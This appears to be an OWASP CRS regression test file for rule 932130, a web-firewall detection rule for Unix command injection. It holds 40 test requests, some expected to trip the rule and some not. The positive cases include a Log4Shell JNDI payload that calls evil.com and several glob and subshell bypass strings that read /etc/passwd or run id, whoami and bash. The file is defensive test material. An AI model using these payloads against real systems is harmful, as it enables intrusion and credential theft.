---
meta:
  author: "Paul Beckett, Max Leske, azurit"
rule_id: 932130
tests:
  - test_id: 1
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          uri: "/get?932130-1=$(cmd)"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 2
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "POST"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          uri: "/post"
          data: "932130-2=${cmd}"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 3
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
            Cookie: "931120-3=<(cmd)"
          uri: "/get"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 4
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
            Cookie: ">(cmd)=931120-4"
          uri: "/get"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 5
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "POST"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          uri: "/post"
          data: "932130-5=Some text (in brackets)."
          version: "HTTP/1.1"
        output:
          log:
            no_expect_ids: [932130]
  - test_id: 6
    desc: "Log4J exploit picked up by shell exploit detection in body"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          headers:
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
            Host: "localhost"
            User-Agent: "OWASP CRS test agent"
            Content-Type: application/json
          method: POST
          port: 80
          uri: "/post"
          data: '{"foo": "${:1337:-x$}{jndi:ldap://evil.com/webshell}"}'
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 7
    desc: "Unix command injection"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: POST
          port: 80
          uri: "/post"
          data: "var=0.84622338492032948`echo${IFS}crs312``echo${IFS}34test`"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932130]
  - test_id: 8
    desc: "Unix command injection - character set bypass technique"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: GET
          port: 80
          # cat /etc/pa[s]swd
          uri: "/get?cmd=cat%20/etc/pa%5Bs%5Dswd"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932130]
  - test_id: 9
    desc: "Unix command injection - character set bypass technique"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: GET
          port: 80
          # cat /[?]tc/pa[?]swd
          uri: "/get?cmd=cat%20/%5B%3F%5Dtc/pa%5B%3F%5Dswd"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932130]
  - test_id: 10
    desc: "Unix command injection - character set bypass - negative test"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: GET
          port: 80
          # hello [text in brackets]
          uri: "/get?cmd=hello%20%5Btext%20in%20brackets%5D"
          version: HTTP/1.1
        output:
          log:
            no_expect_ids: [932130]
  - test_id: 11
    desc: "Unix command injection - bracket bypass"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: GET
          port: 80
          uri: "/get?s=/etc/pas[s]wd"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932130]
  - test_id: 12
    desc: "Unix command injection - bracket bypass"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: GET
          port: 80
          uri: "/get?s=/etc/%5Bp%5Dasswd"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932130]
  - test_id: 13
    desc: "Unix command injection - bracket bypass"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: GET
          port: 80
          uri: "/get?s=/etc/%5B!q%5Dasswd"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932130]
  - test_id: 14
    desc: "Unix command injection - bracket bypass"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: GET
          port: 80
          uri: "/get?s=/etc/%5Bm-z%5Dasswd"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932130]
  - test_id: 15
    desc: "Unix command injection - bracket bypass"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: GET
          port: 80
          uri: "/get?s=/usr/bin/%5Bu%5Dname+-a"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932130]
  - test_id: 16
    desc: "Unix command injection - bracket bypass"
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Host: localhost
            User-Agent: "OWASP CRS test agent"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          method: GET
          port: 80
          uri: "/get?exec=/bi%5Bn%5D/bash"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [932130]
  - test_id: 17
    desc: "Bash - Arithmetic expansion ($[...])"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
          uri: "/get?932130-17=$%5B2%2B2%5D"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 18
    desc: "Positive test: echo $(echo $(cat /etc/passwd))"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?932130-18=echo%20%24%28echo%20%24%28cat%20%2Fetc%2Fpasswd%29%29"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 19
    desc: "Positive test: cat /etc/[p//]asswd"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?932130-19=cat%20%2Fetc%2F%5Bp%2F%2F%5Dasswd"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 20
    desc: "Positive test: cat /[e//]tc/[p//]asswd"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?932130-20=cat%20%2F%5Be%2F%2F%5Dtc%2F%5Bp%2F%2F%5Dasswd"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 21
    desc: "Positive test: cat /[e/////////]tc/[p//]asswd"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?932130-21=cat%20%2F%5Be%2F%2F%2F%2F%2F%2F%2F%2F%2F%5Dtc%2F%5Bp%2F%2F%5Dasswd"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 22
    desc: "Positive test: ls /a[b///]c"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?932130-22=ls%20%2Fa%5Bb%2F%2F%2F%5Dc"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 23
    desc: "Positive test: ls /a[a//]c"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?932130-23=ls%20%2Fa%5Ba%2F%2F%5Dc"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 24
    desc: "Negative test: take this math expression: 1[a/-1]"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?932130-24=take%20this%20math%20expression%3A%201%5Ba%2F-1%5D"
          version: "HTTP/1.1"
        output:
          log:
            no_expect_ids: [932130]
  - test_id: 25
    desc: "Negative test: plase calculate the following a[b/1234*c]"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?932130-25=plase%20calculate%20the%20following%20a%5Bb%2F1234%2Ac%5D"
          version: "HTTP/1.1"
        output:
          log:
            no_expect_ids: [932130]
  - test_id: 26
    desc: "Positive test: nested empty subshell bypass - $(whoami$())"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?cmd=%24%28whoami%24%28%29%29"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 27
    desc: "Positive test: nested empty subshell bypass - $(cat$())"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "POST"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/post"
          data: "932130-27=%24%28cat%24%28%29%29"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 28
    desc: "Positive test: variable expansion with nested empty braces - ${x#{}}"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?var=%24%7Bx%23%7B%7D%7D"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 29
    desc: "Positive test: variable expansion with nested empty braces - ${PATH#{}/}"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?path=%24%7BPATH%23%7B%7D%2F%7D"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 30
    desc: "Positive test: arithmetic expansion with nested empty parens - $(($()42))"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?calc=%24%28%28%24%28%29%2042%29%29"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 31
    desc: "Positive test: command substitution with backticks in variable expansion - ${`id`}"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?cmd=%24%7B%60id%60%7D"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 32
    desc: "Positive test: process substitution with command - <(cat file)"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?proc=%3C%28cat%20file%29"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 33
    desc: "Positive test: output process substitution - >(tee log)"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?out=%3E%28tee%20log%29"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 34
    desc: "Positive test: deprecated arithmetic expansion - $[]"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?math=%24%5B%5D"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 35
    desc: "Positive test: multiple nested command substitutions - $(echo $(cat$(id)))"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "POST"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/post"
          data: "cmd=%24%28echo%20%24%28cat%24%28id%29%29%29"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 36
    desc: "Positive test: glob pattern with negation - /etc/[!abc]asswd"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?file=%2Fetc%2F%5B%21abc%5Dasswd"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 37
    desc: "Positive test: glob with directory and multiple slashes - /[e///]tc"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?path=%2F%5Be%2F%2F%2F%5Dtc"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 38
    desc: "Positive test: bracket globbing with range - /usr/[a-z]in/bash"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?shell=%2Fusr%2F%5Ba-z%5Din%2Fbash"
          version: "HTTP/1.1"
        output:
          log:
            expect_ids: [932130]
  - test_id: 39
    desc: "Negative test: legitimate URL-encoded brackets without globbing pattern - page[1]"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "GET"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/get?page=page%5B1%5D"
          version: "HTTP/1.1"
        output:
          log:
            no_expect_ids: [932130]
  - test_id: 40
    desc: "Negative test: array notation in programming - data[index]"
    stages:
      - input:
          dest_addr: "127.0.0.1"
          method: "POST"
          port: 80
          headers:
            User-Agent: "OWASP CRS test agent"
            Host: "localhost"
            Accept: "*/*"
          uri: "/post"
          data: "932130-40=data%5Bindex%5D"
          version: "HTTP/1.1"
        output:
          log:
            no_expect_ids: [932130]
